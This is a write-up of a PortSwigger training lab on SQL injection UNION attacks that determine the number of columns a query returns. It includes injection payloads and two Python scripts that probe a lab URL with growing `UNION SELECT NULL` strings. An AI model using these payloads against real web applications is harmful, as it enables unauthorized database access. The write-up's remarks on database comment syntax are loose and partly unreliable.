---
title: PortSwigger SQL Injection Lab 7 — Determining the Number of Columns
description: A writeup of PortSwigger's SQL injection lab for determining how many columns the original query returns.
author: Koussay Dhifi
categories: [Writeups, WebExploitation]
tags: [WebExploitation, SQLInjection, PortSwigger, Labs, UNION]
mermaid: true
---

## Introduction

This is the seventh lab in PortSwigger's SQLi labs titled [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns).

The goal of the challenge is to determine how many columns are returned by the SQL query that is executed when we select a specific category.

## Recon

We start with the usual e-commerce app, but with minor design changes, as shown in the following image.

![Lab 7 overview](../assets/sqli/lab7/7-2.png)

## Vulnerability Detection and Analysis

Let's try the usual payload `' OR '1' = '1' --` with and without a space, to see which database we are dealing with. If it needs a space, it is mostly a MySQL database; if it does not need one, it is mostly an Oracle database, since comments in Oracle do not need a space, while comments in MySQL usually do.

We tried the payload without a space for the URL `/filter?category=Accessories`, and we got all categories, as shown in the following image.

![Lab 7 overview](../assets/sqli/lab7/7-1.png)

So either it is an Oracle database or a PostgreSQL database. One uses the `dual` table to select elements without tables, and the other does not need a `dual` table.

```sql
SELECT NULL FROM dual; -- Oracle DB
SELECT NULL; -- PostgreSQL DB
```


## Payload and Exploitation

So what we need to do is a `UNION` attack that respects the following rules.

1. Each `SELECT` in the `UNION` should have the same number of columns.
2. Each column with the same index should have compatible types (`NULL` is compatible with almost all types).

So we are going to write an automated payload for PostgreSQL and another for Oracle DB. Whoever finds the correct query first will reveal the true database.

So what we will do is `UNION SELECT NULL`, and we keep adding `NULL` columns as long as there is an internal server error. If it no longer exists, we have found how many columns there are.

This is the PostgreSQL one:

```py
URL = "https://0afb00bd044ee6be80ee26110025005c.web-security-academy.net/filter?category=Gifts"

queryOne = "' UNION SELECT NULL"
NumberOfColumns = 1

while True:
    print("Trying : " + URL + queryOne + '-- ')
    r = requests.get(URL + queryOne + '-- ')

    if "Internal Server Error" in r.text:
        queryOne = queryOne + ',NULL'
        NumberOfColumns += 1
    else:
        print(f'{queryOne} -- \n Number of Columns returned by the query is {NumberOfColumns}')
        break
```

And this is the Oracle one:

```py
URL = "https://0afb00bd044ee6be80ee26110025005c.web-security-academy.net/filter?category=Gifts"

queryOne = "' UNION SELECT NULL"
queryTwo = " FROM dual"
NumberOfColumns = 1

while True:
    print("Trying : " + URL + queryOne + queryTwo + '-- ')
    r = requests.get(URL + queryOne + queryTwo + '-- ')

    if "Internal Server Error" in r.text:
        queryOne = queryOne + ',NULL'
        NumberOfColumns += 1
    else:
        print(f'{queryOne}{queryTwo} -- \n Number of Columns returned by the query is {NumberOfColumns}')
        break
```

So let's run them simultaneously.

After running them we find that the postgresql script finished with the payload `'+UNION+SELECT+NULL--` and thus the lab is solved.

## Conclusion

This lab is fundamental because UNION attacks depend on matching the column count. Once you understand that, the rest of the series becomes much easier.
